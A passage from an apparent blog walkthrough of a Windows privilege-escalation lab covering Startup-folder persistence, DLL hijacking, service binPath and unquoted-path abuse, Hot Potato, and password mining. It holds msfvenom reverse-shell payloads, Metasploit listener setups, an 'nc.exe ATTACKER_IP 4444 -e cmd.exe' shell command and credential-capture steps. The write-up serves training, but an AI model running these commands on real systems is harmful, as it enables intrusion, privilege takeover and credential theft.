src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task6/task6_execution.png" alt="Task6 Execution" /></p><p>Since, just to remember, in the <em>windows_service.c</em> file that we compiled to generate the x.exe file we have inserted in the <em>Run</em> function the command <code class="language-plaintext highlighter-rouge">cmd.exe /k net localgroup administrators user /add</code>, so we expect that our user is added to the local administrators’ group and, by checking the localgroup, we confirm the successfully exploit:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/administrator_user.png" alt="Task6 Execution" /></p><h3 id="task-7---privilege-escalation---startup-applications-"><span style="color: var(--link-color);">[Task 7] - Privilege Escalation - Startup Applications </span></h3><p>In Windows, as in other operating systems, we can configure some applications to run on boot, including their system privilege. So, if we have permission to write the Startup folder, we can execute malicious files automatically after that some user (we hope admin) do the login.</p><blockquote><p>Detection</p><p>Windows VM</p><ol><li>Open command prompt and type: icacls.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”<li>From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.</ol><p>Exploitation</p><p>Kali VM</p><ol><li>Open command prompt and type: msfconsole<li>In Metasploit (msf &gt; prompt) type: use multi/handler<li>In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp<li>In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]<li>In Metasploit (msf &gt; prompt) type: run<li>Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe<li>Copy the generated file, x.exe, to the Windows VM.</ol><p>Windows VM</p><ol><li>Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.<li>Logoff.<li>Login with the administrator account credentials.</ol><p>Kali VM</p><ol><li>Wait for a session to be created, it may take a few seconds.<li>In Meterpreter(meterpreter &gt; prompt) type: getuid<li>From the output, notice the user is “User-PC\Admin”</ol></blockquote><h5 id="detection-4">Detection</h5><p>To detect this misconfiguration, we use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls">icacls</a> that give us the lists of permissions of the specified file:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task7/task7_icacls_startup.png" alt="icacls" /></p><p>In this case, we can see that the <strong>“BUILTIN\Users”</strong> group has full access <strong>(F)</strong> to the <strong>Startup</strong> directory. Since our user belongs to the Users group, we can put the malicious file that will be generated automatically.</p><h5 id="exploitation-4">Exploitation</h5><p>To do the exploitation of this vulnerability, we set a Metasploit listener:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/msf_multihandle.png" alt="Msf listener" /></p><p>Then we generate the malicious file:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.80.159 LPORT=4444 -f exe -o x.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: x.exe
</pre></table></code></div></div><p>And we upload the generated file on the Windows machine and we copy it on <strong>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</strong> folder: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task7/task7_moveStartup.png" alt="Move in Startup" /></p><p>Now, we simulate the login of the “TCM” user (that is admin):</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rdesktop -u TCM -p "Hacker123" $IP -g 90%
</pre></table></code></div></div><p>And, by returning in our Metasploit listener we obtain the admin access: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task7/task7_administrator_access.png" alt="Admin Access" /></p><p>Note that if we log in with “user” user, we obtain the low-privilege shell: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task7/task7_user_access.png" alt="User Access" /></p><p>And we want to do privilege escalation!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task7/meme.jpg" width="40%" height="40%" /></p><h3 id="task-8---service-escalation---dll-hijacking-"><span style="color: var(--link-color);">[Task 8] - Service Escalation - DLL Hijacking </span></h3><p>When we execute an application in a Windows system, many of the functionalities of the programs are provided by DLL files. Indeed, when a program starts it looks for DLLs. So, if some DLL is missing, and we have the write permission, then we can replace that missing DDL with our malicious file. In this way, when the application starts, it executes our file.</p><p>Generally, a Windows application will use pre-defined search paths to find DLL’s and it will check these paths in the following order:</p><ol><li>The directory from which the application loaded<li>32-bit System directory (C:\Windows\System32)<li>16-bit System directory (C:\Windows\System)<li>Windows directory (C:\Windows)<li>The current working directory (CWD)<li>Directories in the PATH environment variable (first system and then user)</ol><blockquote><p>Detection</p><p>Windows VM</p><ol><li>Open the Tools folder that is located on the desktop and then go the Process Monitor folder.<li>In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.<li>In procmon, select “filter”. From the left-most drop down menu, select ‘Process Name’.<li>In the input box on the same line type: dllhijackservice.exe<li>Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.<li>Next, select from the left-most drop down menu ‘Result’.<li>In the input box on the same line type: NAME NOT FOUND<li>Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.<li>Open command prompt and type: sc start dllsvc<li>Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.</ol><p>Exploitation</p><p>Windows VM</p><ol><li>Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.</ol><p>Kali VM</p><ol><li>Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add<li>Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll<li>Copy the generated file hijackme.dll, to the Windows VM.</ol><p>Windows VM</p><ol><li>Place hijackme.dll in ‘C:\Temp’.<li>Open command prompt and type: sc stop dllsvc &amp; sc start dllsvc<li>It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</ol></blockquote><h5 id="detection-5">Detection</h5><p>To detect this vulnerability, we must find some missing DLL that some programs look for. To do this, we use <strong>Procmon.exe</strong>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_procmon.png" alt="Procmon" /></p><p>There are many processes but use the function <strong>filter</strong> to search what we want:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_procmon_filter.png" alt="Filter" /></p><p>So, we filter the <strong>Process Name</strong> by searching <strong>dllhijackservice.exe</strong>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_procmon_processname.png" alt="Filter Process Name" /></p><p>And we add the rule (we note the first row is our rule, just created):</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_procmon_add_process.png" alt="Add Rule" /></p><p>Then, since we look for missing DLL, we filter the <strong>Result</strong> field with the string <strong>NAME NOT FOUND</strong> and we add the rule:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_procmon_notfound.png" alt="Filter Not Found" /></p><p>Now, we can run the <strong>dllsvc</strong> service:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_dllsvc.png" alt="Dllsvc" /></p><p>And, by returning to procmon, we have the following result:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_procmon_dllsvc2.png" alt="Procmon dllsvc" /></p><p>These are some of the DLLs that the program dllhijackservice.exe can not found. We can note the last row which contains the path <strong>C:\Temp\hijackme.dll</strong>. If we have permission to overwrite this file, we can replace it with a malicious file.</p><h5 id="exploitation-5">Exploitation</h5><p>Since in the Windows machine there are some tools already uploaded, we downloaded on our Kali machine the source code in <strong>C:\Users\User\Desktop\Tools\Source\windows_dll.c</strong>and we change the function <em>DllMain</em>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_modify_code.png" alt="Modify Source Code" /></p><p>We compile it with the command:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
</pre></table></code></div></div><p>We upload the compiled fil in victim machine and we copy it in <strong>C:\Temp</strong>: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_copy_hijackdll.png" alt="Copy File" /></p><p>Finally, we stop and start the dllsvc service with the command:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>exec sc stop dllsvc &amp; sc start dllsvc
</pre></table></code></div></div><p>And we confirm the successfully exploit by checking if the user belongs to the localgroup administrators:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task8/task8_administrator.png" alt="Administrator" /></p><h3 id="task-9---service-escalation---binpath-"><span style="color: var(--link-color);">[Task 9] - Service Escalation - binPath </span></h3><p><strong>binPath</strong> is used to specific binary paths to Windows services. If we have permission to modify the configuration, we can exploit this vulnerability. To check the permission, we can use <strong>accesschk</strong>.</p><blockquote><p>Detection</p><p>Windows VM</p><ol><li><p>Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc</p><li><p>Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.</p></ol><p>Exploitation</p><p>Windows VM</p><ol><li>In command prompt type: sc config daclsvc binpath= “net localgroup administrators user /add”<li>In command prompt type: sc start daclsvc<li>It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</ol></blockquote><h5 id="detection-6">Detection</h5><p>We run accesschk to check the permission of <strong>daclsvc</strong> service:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task9/detection.png" alt="Detection" /></p><p>We note that the <strong>Everyone</strong> has the <strong>“SERVICE_CHANGE_CONFIG”</strong> permission. Thanks to this, we can configure the daclsvc service (owned by the system) to run whatever command we want, like, for example, a command to elevate the user to admin privileges or maybe a command that sends back a shell with system privileges (sc config daclsvc binpath= “nc.exe ATTACKER_IP 4444 -e cmd.exe”). In this case, we add the user in the administrator localgroup.</p><h5 id="exploitation-6">Exploitation</h5><p>To exploit this, we run the following command:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sc config daclsvc binpath= "net localgroup administrators user /add"
</pre></table></code></div></div><p>Then we start the daclsvc service with the command <code class="language-plaintext highlighter-rouge">sc start daclsvc</code> and finally, we check that the user belongs to administrator localgroup:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task9/execution.png" alt="Execution" /></p><h3 id="task-10---service-escalation---unquoted-service-paths-"><span style="color: var(--link-color);">[Task 10] - Service Escalation - Unquoted Service Paths </span></h3><p>When a service is started, the Windows system tries to find the location of the executable to run the service. Indeed, if the executable path is enclosed in the quote “” then the system will know exactly where to find it. But, if in the path there are any quotes, then Windows will look for it and execute it in every folder of the path. So, for example, if we have the path</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:\Program Files\Unquoted Path Service\Common Files\service.exe
</pre></table></code></div></div><p>Windows will search in this order:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>    C:\Program.exe
    C:\Program Files\Unquoted.exe
    C:\Program Files\Unquoted Path.exe
    C:\Program Files\Unquoted Path Service\Common.exe
    C:\Program Files\Unquoted Path Service\Common Files\service.exe
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task10/meme.jpg" width="40%" height="40%" /></p><blockquote><p>Detection</p><p>Windows VM</p><ol><li>Open command prompt and type: sc qc unquotedsvc<li>Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.</ol><p>Exploitation</p><p>Kali VM</p><ol><li>Open command prompt and type: msfvenom -p windows/exec CMD=’net localgroup administrators user /add’ -f exe-service -o common.exe<li>Copy the generated file, common.exe, to the Windows VM.</ol><p>Windows VM</p><ol><li>Place common.exe in ‘C:\Program Files\Unquoted Path Service’.<li>Open command prompt and type: sc start unquotedsvc<li>It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators</ol><p>For additional practice, it is recommended to attempt the TryHackMe room Steel Mountain (https://tryhackme.com/room/steelmountain).</p></blockquote><h5 id="detection-7">Detection</h5><p>To view the information about services we can use <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742055(v=ws.11)"><strong>sc</strong></a> utility and we use the <strong>qc</strong> command to display the information, in particular ,the <strong>“BINARY_PATH_NAME”</strong> field which we are interested.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task10/detection.png" alt="Detection" /></p><p>We can see that in the “BINARY_PATH_NAME” we have the path <strong>C:\Program Files\Unquoted Path Services\Common Files\unquotedpathservice.exe</strong>. We want to place some malicious file in that path so that Windows will execute it.</p><h5 id="exploitation-7">Exploitation</h5><p>So we choose to place a file named <strong>common.exe</strong> in the path <strong>C:\Program Files\Unquoted Path Service</strong>.</p><p>We generate the malicious file:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 224 bytes
Final size of exe-service file: 15872 bytes
Saved as: common.exe
</pre></table></code></div></div><p>Then we upload the file and copy it in C:\Program Files\Unquoted Path Service: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task10/copy_file.png" alt="Copy File" /></p><p>Then we start the <strong>unquotedsvc</strong> service (by using the command <code class="language-plaintext highlighter-rouge">sc start unquotedsvc</code>) and we check if our user belongs to administrator localgroup:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task10/administrator.png" alt="Administrator" /></p><h3 id="task-11---potato-escalation---hot-potato-"><span style="color: var(--link-color);">[Task 11] - Potato Escalation - Hot Potato </span></h3><p>“Hot Potato is a technique that takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP-&gt;SMB relay) and NBNS spoofing”.</p><p>You can read more about the exploit <a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">here</a>.</p><blockquote><p>Exploitation</p><p>Windows VM</p><ol><li>In command prompt type: powershell.exe -nop -ep bypass<li>In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1<li>In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command “net localgroup administrators user /add”<li>To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators</ol></blockquote><h5 id="exploitation-8">Exploitation</h5><p>To exploit this vulnerability, we can use <strong>Tater</strong> module that is a PowerShell implementation of the Hot Potato Windows Privilege Escalation. So we, first, start Powershell with bypass option to bypass firewall:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>powershell.exe -nop -ep bypass
</pre></table></code></div></div><p>Then, we import the Tater module:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
</pre></table></code></div></div><p>Finally, we run the Tater module bypassing the command <strong>net localgroup administrators user /add</strong> to add our user in administrators localgroup:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
</pre></table></code></div></div><p>The execution and the output of the command <code class="language-plaintext highlighter-rouge">net localgroup administrators</code> to check if the exploit had success: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task11_exploitation.png" alt="Exploitation" /></p><h3 id="task-12---password-mining-escalation---configuration-files-"><span style="color: var(--link-color);">[Task 12] - Password Mining Escalation - Configuration Files </span></h3><p>Many times the developers or the administrator put the password in the configuration files. Therefore, by searching words like “password” or “passwd” we can obtain the password used in the system. Also, these passwords are obfuscated in base64, so it is easy to retrieve the cleartext.</p><blockquote><p>Exploitation</p><p>Windows VM</p><ol><li>Open command prompt and type: notepad C:\Windows\Panther\Unattend.xml<li>Scroll down to the “<Password>” property and copy the base64 string that is confined between the “<Value>” tags underneath it.</Value></Password></ol><p>Kali VM</p><ol><li>In a terminal, type: <code class="language-plaintext highlighter-rouge">echo [copied base64] | base64 -d</code><li>Notice the cleartext password</ol></blockquote><h5 id="exploitation-9">Exploitation</h5><p>In this task, the password is in the <strong>C:\Windows\Panther\Unattend.xml</strong> file and it is in base64.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task12_exploitation2.png" alt="Exploitation" /></p><p>So, we take the base64 password and with the following command we can obtain the password in cleartext:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ echo cGFzc3dvcmQxMjM= | base64 -d
&gt; password123 
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task12_meme.jpg" width="40%" height="40%" /></p><h3 id="task-13---password-mining-escalation---memory-"><span style="color: var(--link-color);">[Task 13] - Password Mining Escalation - Memory </span></h3><p>Sometimes services save the user credentials in clear text in memory. When this happens, we can dump what is saved in the memory and read the saved credentials.</p><blockquote><p>Exploitation</p><p>Kali VM</p><ol><li>Open command prompt and type: msfconsole<li>In Metasploit (msf &gt; prompt) type: use auxiliary/server/capture/http_basic<li>In Metasploit (msf &gt; prompt) type: set uripath x<li>In Metasploit (msf &gt; prompt) type: run</ol><p>Windows VM</p><ol><li>Open Internet Explorer and browse to: http://[Kali VM IP Address]/x<li>Open command prompt and type: taskmgr<li>In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” columnand select “Create Dump File” from the popup menu.<li>Copy the generated file, iexplore.DMP, to the Kali VM.</ol><p>Kali VM</p><ol><li>Place ‘iexplore.DMP’ on the desktop.<li>Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep “Authorization: Basic”<li>Select the Copy the Base64 encoded string.<li>In command prompt type: echo -ne [Base64 String] | base64 -d<li>Notice the credentials in the output.</ol></blockquote><p>To exploit this vulnerability, we use the <a href="https://www.rapid7.com/db/modules/auxiliary/server/capture/http_basic/"><strong>http_basic</strong></a> module of Metasploit to generate a prompt for credentials.</p><p>We set the field <strong>SRVHOST</strong>, <strong>SRVPORT</strong> with the Kali Machine IP and port that will simulate a web server and the <strong>URIPATH</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>msf6 auxiliary(server/capture/http_basic) &gt; show options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      10.8.80.159      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      8000             yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH      x                no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run capture web server

</pre></table></code></div></div><p>So, we have a fake web server on http://10.8.80.159:8000/x. From the Windows Machine, we connect to that URL to simulate the attack:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task13/login_explorer.png" alt="Login Explorer" /></p><p>After that we insert the credentials, we want to dump what the internet explorer had saved. To do this, we use the task manager utility of Windows, we select the <strong>Internet Explorer</strong> application and by right-clicking we open a menù in which we have the <strong>Create Dump File</strong> voice:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task13/create_dump.png" alt="Create Dump" /></p><p>We click that voice and the dump file will be saved:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task13/dump_done.png" alt="Dump Done" /></p><p>Going in the path, we check the file:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task13/location_dump.png" alt="Location Dump" /></p><p>We copy the dump file in the Kali machine and then, we should use the command <code class="language-plaintext highlighter-rouge">strings /root/Desktop/iexplore.DMP \| grep "Authorization: Basic"</code> to retrieve the credentials and finally we run <code class="language-plaintext highlighter-rouge">echo -ne [Base64 String] \| base64 -d</code> to retrieve the cleartext credentials.</p><p>Unfortunately, this process did not work for me. I try to search different strings like Authentication, Authorisation, Basic but I can retrieve anything. Maybe there was an issue, I follow the written instructions.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task13/meme.gif" width="40%" height="40%" /></p><p>But, on the other side, we can see the credentials in the Metasploit console:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msf6 auxiliary(server/capture/http_basic) &gt; run
[*] Auxiliary module running as background job 2.

[*] Using URL: http://10.8.80.159:8000/x
[*] Server started.
[*] Sending 401 to client 10.10.202.219
[+] HTTP Basic Auth LOGIN 10.10.202.219 "test:test" / /x
</pre></table></code></div></div><h3 id="task-14---privilege-escalation---kernel-exploits-"><span style="color: var(--link-color);">[Task 14] - Privilege Escalation - Kernel Exploits </span></h3><p>If the Operating Systems is not updated regularly, we can find some older version of the kernel that allows us to use public exploits. In this case, the kernel exploit is the <strong>MS16_014</strong>.</p><blockquote><p>Establish a shell</p><p>Kali VM</p><ol><li>Open command prompt and type: msfconsole<li>In Metasploit (msf &gt; prompt) type: use multi/handler<li>In Metasploit (msf &gt; prompt) type: set payload windows/meterpreter/reverse_tcp<li>In Metasploit (msf &gt; prompt) type: set lhost [Kali VM IP Address]<li>In Metasploit (msf &gt; prompt) type: run<li>Open an additional command prompt and type: msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe &gt; shell.exe<li>Copy the generated file, shell.exe, to the Windows VM.</ol><p>Windows VM</p><ol><li>Execute shell.exe and obtain reverse shell</ol><p>Detection &amp; Exploitation</p><p>Kali VM</p><ol><li>In Metasploit (msf &gt; prompt) type: run post/multi/recon/local_exploit_suggester<li>Identify exploit/windows/local/ms16_014_wmi_recv_notif as a potential privilege escalation<li>In Metasploit (msf &gt; prompt) type: use exploit/windows/local/ms16_014_wmi_recv_notif<li>In Metasploit (msf &gt; prompt) type: set SESSION [meterpreter SESSION number]<li>In Metasploit (msf &gt; prompt) type: set LPORT 5555<li>In Metasploit (msf &gt; prompt) type: run</ol><p>NOTE: The shell might default to your eth0 during this attack. If so, ensure you type set lhost [Kali VM IP Address] and run again.</p></blockquote><h5 id="establish-a-shell">Establish a shell</h5><p>We use Metasploit to set a listener (we use the windows/meterpreter/reverse_tcp payload):</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>msf6 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set LHOST 10.8.80.159
LHOST =&gt; 10.8.80.159
msf6 exploit(multi/handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.80.159      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

</pre></table></code></div></div><p>We then generate the malicious file that we use to obtain a reverse shell (<strong>pay attention to the payloads</strong>, it must be the same that we set in Metasploit listener otherwise we can have an unstable shell):</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.80.159 lport=4444 -f exe &gt; shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
